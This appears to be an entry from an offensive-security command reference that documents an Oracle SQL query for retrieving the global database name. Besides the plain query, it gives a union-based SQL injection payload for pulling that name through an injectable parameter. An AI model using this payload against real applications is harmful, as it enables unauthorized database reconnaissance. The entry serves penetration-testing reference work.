---
type: command
executor: sql
data: SELECT global_name FROM global_name;
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Oracle Database
tags:
  - oracle-sql
  - discovery
verified: true
validated: true
---

# oracle-retrieve-global-database-name

## Command

```sql
SELECT global_name FROM global_name;
```

## Description

This SQL command queries the global_name view in an Oracle database to retrieve the fully qualified global database name, combining the DB_NAME and DB_DOMAIN for unique identification across Oracle networks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This is a parameterless query; execute directly in a SQL client or via injection. | N/A |

## Examples

### Basic Usage

```sql
SELECT global_name FROM global_name;
```

### In SQL Injection Context

Append to an injectable parameter, e.g., `' UNION SELECT global_name FROM global_name--` to extract via union-based injection.

## Expected Output

A single row with the global name, e.g.:

GLOBAL_NAME
------------
ORCL.MYDOMAIN.COM

## Related

- [[procedures/Oracle-SQL-Database-Name-Enumeration]]
- [[commands/oracle-retrieve-database-name]]
